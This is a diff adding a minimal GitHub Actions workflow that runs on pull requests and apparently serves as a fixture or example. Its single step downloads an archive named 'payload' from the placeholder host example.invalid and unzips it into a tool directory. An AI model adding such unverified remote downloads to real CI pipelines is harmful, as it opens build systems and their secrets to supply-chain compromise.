@@ -1,0 +1,9 @@
+---
+name: ci
+on:
+  pull_request:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL -o payload https://example.invalid/payload && unzip payload -d tool
